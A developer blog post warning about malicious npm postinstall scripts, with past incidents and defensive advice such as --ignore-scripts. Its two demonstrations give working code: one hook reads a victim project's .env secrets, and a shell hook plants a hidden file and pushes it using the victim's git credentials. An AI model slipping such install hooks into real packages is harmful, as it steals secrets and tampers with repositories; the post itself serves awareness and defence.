---
layout: post
title:  "NPM and Evil Scripts"
image: 
date:   2019-06-10 01:04:13 +0300
tags:
  - NPM
  - Javascript
---

If you are writing javascript, then you probably used NPM. And you probably heard the cries of many javascript developers of how people are overusing NPM packages as dependencies without worrying. If you are one of these people who are not worried, you definitely should be. In this post, I will try to show you one of the reasons why you should be worried.

## Incidents of the Past

Have you heard about the [eslint-scope hijack](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes)? or perhaps the [event-stream incident](https://github.com/dominictarr/event-stream/issues/116)? or just last June when the NPM security team ["foiled a plot to steal cryptocurrency"](https://blog.npmjs.org/post/185397814280/plot-to-steal-cryptocurrency-foiled-by-the-npm)?

Stolen credentials of one developer, a new maintainer, and a malicious package publisher. All lead to different types of security incidents.

New packages are being published to NPM every day. Many of them are useful, some are not so much, and some are malicious. From phishing attempts to make you install the wrong package, to packages that try to steal or manipulate your system files.

## NPM Scripts

Have you ever used `npm start` or `npm test` or even `npm install`? If so then you are already using NPM scripts. There are few scripts defined by NPM: start, test, and install are few examples. You can read the full list of all predefined scripts in the [NPM documentations](https://docs.npmjs.com/misc/scripts). Additionally, you can define your own scripts and run them with `npm run mycommand`.

## The Dangers of NPM Scripts

Reading NPM documentation about the `postinstall` script:
> Run AFTER the package is installed

This could be useful in many instances, and also dangerous in other situations.

Let's take few examples of how the `postinstall` script can be used by malicious developers to attack you, the poor developer.

## Post Install of Doom Example #1

Let's try something simple. In many node applications, there is a file called `.env`. This file is most likely not committed to source control. It may hold few critical information about your environment. Let's steal it, shall we?!! I will first create a normal npm package, that literally does nothing.

1. First create the package directory:

    ```console
    $ mkdir blog-npm-scripts && cd blog-npm-scripts
    ```

2. Create a `postinstall.js` file and let's try to read the `.env` file:

    ```javascript
    const Path = require('path');
    const fs = require('fs');

    // example: steal stuff from your code-base: an environment file for example
    const workingDirectory = process.cwd();

    const envFilePath = Path.join(workingDirectory, '../..', '.env');

    fs.readFile(envFilePath, 'utf8', (err, data) => {
        if (err) {}

        // I can do whatever
        // for example: I can send these to a remote server!
        console.log(data);
    });
    ```

    Your package is installed under `node_module/blog-npm-scripts`. The code above tries to break out of the `node_modules` directory into the root of the victim's codebase.

3. Add postinstall script in `package.json`:

    ```json
    {
      "name": "blog-npm-scripts",
      "version": "1.0.0",
      "description": "",
      "main": "index.js",
      "scripts": {
        "postinstall": "node ./postinstall.js"
      },
      "author": "",
      "license": "MIT"
    }
    ```

4. An unsuspecting developers installs your package:

    ![example #1 result](/assets/images/npm-evil-scripts-result-1.png)

And done!! We stole this poor developer's environment files.

## Post Install of Doom Example #2

Let's try something slightly more extreme. Let's target those who are using some kind of credential helpers. These users will be most likely auto logged in when executing git commands. Let's try to leverage that to our advantage and inject some code into their codebase.

This time, we will use a shell script.

1. Create a `postinstall.sh` file:

    ```console
      # break outside node_modules
      cd ../..

      # create sneaky javascript file
      touch .sneaky.js

      echo 'module.exports = () => console.log("You cannot even see me")' >> .sneaky.js

      echo 'require("./.sneaky.js")()' >> index.js

      LAST_MESSAGE="$(git log -1 --pretty=%B)"

      git add .

      git commit -m "$LAST_MESSAGE"

      git push origin master
    ```

    The script above creates a file called `.sneaky.js` in the codebase root directory then attempts to push that code to source control using the last commit message.

2. Replace the `postinstall` script in `package.json`:

    ```json
      {
        "scripts": {
          "postinstall": "sh ./postinstall.sh"
        }
      }
    ```

3. An unsuspecting developers installs your package:
    ![example #2 result](/assets/images/npm-evil-scripts-result-2.png)
    As you can see the code was pushed to Github.

## Possibilities are Endless

These are just two simple examples. There are more complex and infinite ways malicious publishers can exploit these scripts. They can trick you into executing sudo commands using `"postinstall": "sudo whatever"`, modify or corrupt your system files, steal valuable information, or install malicious software.

## What can I do?

Few words of advice:
1. Don't install packages for everything.
2. If you install something, do a background check:
    - Ensure the package has a repository link.
    - Ensure the package is actively being maintained.
    - Ensure there is a way of reporting issues and bugs.
    - NPM audits: run `npm audit` to find what are the vulnerable packages.
3. Run npm install with the `--ignore-scripts` flag.
4. If you find a malicious package, report it immediately.

NPM is great but just like other great things, it can be used to do harm. Don't trust everything on NPM blindly.